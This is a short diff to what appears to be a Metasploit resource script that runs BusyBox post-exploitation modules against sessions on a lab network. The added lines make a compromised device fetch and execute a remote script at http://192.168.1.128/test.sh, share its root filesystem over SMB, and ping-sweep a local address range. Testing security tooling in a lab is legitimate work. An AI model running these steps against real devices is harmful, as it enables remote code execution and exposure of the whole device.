@@ -34,6 +34,21 @@ print_line("starting ...")
 print_line("")
 
 session=prepare_session()
+run_single("use post/linux/manage/busybox_wgetandexec")
+run_single("set URL http://192.168.1.128/test.sh")
+run_single("set SESSION #{session}")
+run_single("set VERBOSE yes")
+run_single("run")
+sleep 1
+
+session=prepare_session()
+run_single("use post/linux/manage/busybox_smb_share_root")
+run_single("set SESSION #{session}")
+run_single("set VERBOSE yes")
+run_single("run")
+sleep 1
+
+session=prepare_session()
 run_single("use post/linux/gather/busybox_enum_hosts")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
@@ -76,7 +91,7 @@ sleep 1
 session=prepare_session()
 run_single("use post/linux/gather/busybox_pingnet")
 run_single("set IPRANGESTART 192.168.1.1")
-run_single("set IPRANGEEND 192.168.1.255")
+run_single("set IPRANGEEND 192.168.1.10")
 run_single("set SESSION #{session}")
 run_single("set VERBOSE yes")
 run_single("run")
